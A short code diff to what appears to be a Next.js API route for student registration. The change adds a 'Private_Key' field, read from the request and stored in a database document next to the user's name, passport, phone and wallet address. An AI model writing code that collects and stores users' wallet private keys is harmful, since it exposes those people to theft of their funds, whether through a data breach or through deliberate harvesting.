@@ -11,14 +11,14 @@ const databases = new Databases(client);
 
 export async function POST(request) {
   try {
-    const { Matric_Number, Full_Name, Passport, Phone, Wallet } =
+    const { Matric_Number, Full_Name, Passport, Phone, Wallet, Private_Key } =
       await request.json();
 
     const response = await databases.createDocument(
       "66c697500037408588ce",
       "66c8165400080ed249cf",
       ID.unique(),
-      { Matric_Number, Full_Name, Passport, Phone, Wallet }
+      { Matric_Number, Full_Name, Passport, Phone, Wallet, Private_Key }
     );
 
     return NextResponse.json(
